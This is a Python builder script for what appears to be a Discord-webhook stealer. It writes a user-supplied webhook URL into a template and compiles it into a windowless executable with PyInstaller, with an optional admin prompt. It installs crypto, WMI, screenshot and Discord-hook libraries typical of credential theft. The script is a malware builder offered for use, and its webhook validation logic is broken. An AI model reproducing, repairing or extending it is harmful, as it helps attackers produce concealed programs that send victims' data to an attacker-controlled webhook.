import subprocess, os, shutil

uac = False

get_hook = input("Enter your Discord webhook URL : ")
quesiton = input("Start as admin true/false : ")
if quesiton.lower() == "yes" or quesiton.lower() == "y" or quesiton.lower() == "true":
    uac = True
else:
    uac = False

if not get_hook.startswith("https://discord.com/api/webhooks/"):
    print("Please write a corret webhook URL")
    exit(0)
elif not get_hook.startswith("https://discordapp.com/api/webhooks/"):
    print("Please write a corret webhook URL")
    exit(0)
else:
    file = open("main.py", "r")
    sourceCode = file.read()
    newCode = sourceCode.replace("%WEBHOOK_URL%", get_hook)
    with open(r"stub.py", "w") as exela:
        exela.write(newCode)

def build():
    global uac
    if uac == True:
        command = "pyinstaller --onefile --noconsole --clean --uac-admin stub.py"
    else:
        command = "pyinstaller --onefile --noconsole --clean stub.py"
    subprocess.run(command, shell=True)
    try:
        os.remove("stub.py")
        os.remove("stub.spec")
        shutil.rmtree("build")
        shutil.copyfile()
    except:
        pass
    subprocess.run("start dist", shell=True)
    
def installer():
    subprocess.Popen("pip install requests")
    subprocess.Popen("pip install pypiwin32")
    subprocess.Popen("pip install pycryptodo")
    subprocess.Popen("pip install pycryptodome")
    subprocess.Popen("pip install wmi")
    subprocess.Popen("pip install mss")
    subprocess.Popen("pip install dhooks")
    subprocess.Popen("pip install pyinstaller")

def removee():
    try:
        shutil.rmtree("dist")
        shutil.rmtree("build")
        os.remove("stub.spec")
    except:
        pass  

if __name__ == '__main__':
    removee()
    installer()
    build()
    